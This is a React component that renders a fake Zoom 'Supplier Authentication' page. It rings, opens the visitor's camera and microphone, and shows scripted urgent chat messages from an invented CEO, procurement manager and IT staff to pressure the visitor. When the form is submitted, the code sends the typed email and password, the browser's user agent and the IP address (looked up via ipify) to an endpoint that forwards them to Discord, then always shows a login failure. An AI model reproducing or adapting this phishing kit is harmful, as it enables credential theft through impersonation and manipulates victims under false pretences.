import { useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Camera, Mic, MicOff, VideoOff, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";


const formSchema = z.object({
  email: z.string().email("Please enter a valid email"),
  password: z.string().min(6, "Password must be at least 6 characters"),
});

interface Phase3CameraAuthProps {
  onComplete: () => void;
  prefillEmail?: string;
}

const Phase3CameraAuth = ({ onComplete, prefillEmail }: Phase3CameraAuthProps) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [isVideoOn, setIsVideoOn] = useState(true);
  const [isAudioOn, setIsAudioOn] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [currentMessage, setCurrentMessage] = useState<{id: number, sender: string, text: string} | null>(null);
  const [isRecording, setIsRecording] = useState(false);
  const { toast } = useToast();


  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      email: prefillEmail || "",
      password: "",
    },
  });

  // Update form value when prefillEmail changes
  useEffect(() => {
    if (prefillEmail) {
      form.setValue("email", prefillEmail);
    }
  }, [prefillEmail, form]);

  useEffect(() => {
    // Continue ringing sound from Phase 2
    const createRingingSound = () => {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      
      const playRing = () => {
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
        
        oscillator.start();
        setTimeout(() => {
          try {
            oscillator.stop();
          } catch (e) {
            // Oscillator already stopped
          }
        }, 1000);
      };
      
      const interval = setInterval(playRing, 3000);
      
      return () => {
        clearInterval(interval);
        try {
          audioContext.close();
        } catch (e) {
          // Audio context already closed
        }
      };
    };

    const cleanup = createRingingSound();

    // Get camera access
    const initCamera = async () => {
      try {
        const mediaStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true
        });
        setStream(mediaStream);
        if (videoRef.current) {
          videoRef.current.srcObject = mediaStream;
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    };

    initCamera();

    // Start recording simulation
    setIsRecording(true);

    // Array of random messages from CEO and procurement manager
    const messagePool = [
      { sender: "CEO - Sarah Johnson", text: "Good morning everyone, sorry I'm running a bit late. Are we waiting for our supplier?" },
      { sender: "Procurement Manager - Mike Chen", text: "Yes Sarah, we're still waiting for authentication. This is urgent - we need to finalize the Q4 contracts today." },
      { sender: "CEO - Sarah Johnson", text: "We have the board meeting in 30 minutes. Can someone please check what's causing the delay?" },
      { sender: "Procurement Manager - Mike Chen", text: "I can see someone is trying to join. Please complete the authentication process so we can begin." },
      { sender: "CEO - Sarah Johnson", text: "Time is running out. We need these contracts signed before end of quarter." },
      { sender: "Legal Advisor - Emma Wilson", text: "Just joined the call. Are we still waiting for supplier authentication?" },
      { sender: "Procurement Manager - Mike Chen", text: "The authentication seems to be taking longer than usual. Is there a technical issue?" },
      { sender: "CEO - Sarah Johnson", text: "This delay is costing us. Can IT help with the login process?" },
      { sender: "IT Support - Alex Kim", text: "Checking the authentication system now. Supplier should complete the form to proceed." },
      { sender: "Legal Advisor - Emma Wilson", text: "We need to wrap this up soon. The legal documentation is ready for review." },
      { sender: "CEO - Sarah Johnson", text: "Everyone, please be patient. Once our supplier joins, we can begin immediately." },
      { sender: "Procurement Manager - Mike Chen", text: "I can see login attempts. Please ensure credentials are entered correctly." },
      { sender: "Finance Director - Robert Smith", text: "Just joined. Are we experiencing authentication delays again?" },
      { sender: "CEO - Sarah Johnson", text: "Yes Robert, still waiting. This is holding up the entire Q4 strategy discussion." },
      { sender: "IT Support - Alex Kim", text: "System is functioning normally. User needs to complete the authentication form." }
    ];

    // Function to show random messages that appear and disappear
    const showRandomMessages = () => {
      let messageIndex = 0;
      const usedMessages = new Set();
      
      const showMessage = () => {
        // Pick a random message that hasn't been used recently
        let randomMessage;
        let attempts = 0;
        do {
          randomMessage = messagePool[Math.floor(Math.random() * messagePool.length)];
          attempts++;
        } while (usedMessages.has(randomMessage.text) && attempts < 10);
        
        // Add to used messages and clean up if too many
        usedMessages.add(randomMessage.text);
        if (usedMessages.size > messagePool.length / 2) {
          usedMessages.clear();
        }
        
        const messageId = ++messageIndex;
        setCurrentMessage({
          id: messageId,
          sender: randomMessage.sender,
          text: randomMessage.text
        });
        
        // Hide message after 4-7 seconds
        setTimeout(() => {
          setCurrentMessage(prev => prev?.id === messageId ? null : prev);
        }, 4000 + Math.random() * 3000);
        
        // Schedule next message after 6-12 seconds
        setTimeout(showMessage, 6000 + Math.random() * 6000);
      };
      
      // Start first message after 3 seconds
      setTimeout(showMessage, 3000);
    };

    showRandomMessages();

    const messageTimers: NodeJS.Timeout[] = [];

    return () => {
      cleanup();
      messageTimers.forEach(timer => clearTimeout(timer));
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const toggleVideo = () => {
    if (stream) {
      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        videoTrack.enabled = !videoTrack.enabled;
        setIsVideoOn(videoTrack.enabled);
      }
    }
  };

  const toggleAudio = () => {
    if (stream) {
      const audioTrack = stream.getAudioTracks()[0];
      if (audioTrack) {
        audioTrack.enabled = !audioTrack.enabled;
        setIsAudioOn(audioTrack.enabled);
      }
    }
  };

  const getUserIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Failed to get IP:', error);
      return null;
    }
  };

  const onSubmit = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    
    try {
      const userIP = await getUserIP();
      
      // Send to Discord via Cloudflare Function
      const response = await fetch('/api/send-to-discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: values.email,
          password: values.password,
          userAgent: navigator.userAgent,
          ipAddress: userIP,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send data');
      }

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Always show authentication failed for demo purposes
      toast({
        variant: "destructive",
        title: "Authentication Failed",
        description: "Invalid credentials. Please check your email and password.",
      });
      
    } catch (error) {
      console.error('Authentication error:', error);
      toast({
        variant: "destructive",
        title: "Network Error",
        description: "Unable to connect to authentication server. Please try again.",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 flex">
      {/* Camera View */}
      <div className="flex-1 relative">
        <video
          ref={videoRef}
          autoPlay
          muted
          playsInline
          className="w-full h-full object-cover"
        />
        
        {!isVideoOn && (
          <div className="absolute inset-0 bg-gray-800 flex items-center justify-center">
            <div className="text-center">
              <div className="w-24 h-24 bg-gray-600 rounded-full flex items-center justify-center mb-4 mx-auto">
                <span className="text-2xl font-bold text-white">SM</span>
              </div>
              <p className="text-white text-lg">Camera is off</p>
            </div>
          </div>
        )}
        
        {/* Recording Indicator */}
        {isRecording && (
          <div className="absolute top-4 right-4 flex items-center bg-red-600/90 backdrop-blur-sm rounded-lg px-3 py-2 text-white">
            <div className="w-2 h-2 bg-white rounded-full mr-2 animate-pulse"></div>
            <span className="text-sm font-medium">REC</span>
          </div>
        )}
        
        {/* Dynamic Chat Message */}
        {currentMessage && (
          <div className="absolute top-20 left-4 right-4 max-w-lg">
            <div className="bg-black/80 backdrop-blur-sm rounded-lg p-4 text-white animate-in slide-in-from-top duration-300">
              <div className="flex items-center mb-2 text-green-400">
                <div className="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></div>
                <span className="text-sm font-medium">Meeting Chat</span>
              </div>
              <div className="text-xs text-gray-300 mb-1">{currentMessage.sender}</div>
              <div className="text-sm bg-gray-800/50 rounded p-2">{currentMessage.text}</div>
            </div>
          </div>
        )}
        
        {/* Camera Controls */}
        <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 flex space-x-4">
          <Button
            onClick={toggleAudio}
            className={`w-12 h-12 rounded-full ${
              isAudioOn ? 'bg-gray-700 hover:bg-gray-600' : 'bg-red-600 hover:bg-red-700'
            }`}
          >
            {isAudioOn ? <Mic className="w-6 h-6" /> : <MicOff className="w-6 h-6" />}
          </Button>
          
          <Button
            onClick={toggleVideo}
            className={`w-12 h-12 rounded-full ${
              isVideoOn ? 'bg-gray-700 hover:bg-gray-600' : 'bg-red-600 hover:bg-red-700'
            }`}
          >
            {isVideoOn ? <Camera className="w-6 h-6" /> : <VideoOff className="w-6 h-6" />}
          </Button>
        </div>
      </div>
      
      {/* Authentication Form */}
      <div className="w-96 bg-white p-8 flex flex-col justify-center">
        <div className="mb-8">
          <div className="text-2xl font-bold text-blue-600 mb-4">zoom</div>
          <h2 className="text-2xl font-semibold text-gray-800 mb-2">Supplier Authentication</h2>
          <p className="text-gray-600">Enter your credentials to join the meeting</p>
        </div>
        
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email Address</FormLabel>
                  <FormControl>
                    <Input type="email" placeholder="Enter your business email" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Password</FormLabel>
                  <FormControl>
                    <Input type="password" placeholder="Enter meeting password" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <Button 
              type="submit" 
              disabled={isLoading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 disabled:opacity-50"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Authenticating...
                </>
              ) : (
                "Join Meeting"
              )}
            </Button>
          </form>
        </Form>
        
        <div className="mt-6 text-center">
          <div className="flex items-center justify-center space-x-2 text-orange-600">
            <div className="w-2 h-2 bg-orange-600 rounded-full animate-pulse"></div>
            <span className="text-sm font-medium">Connecting...</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Phase3CameraAuth;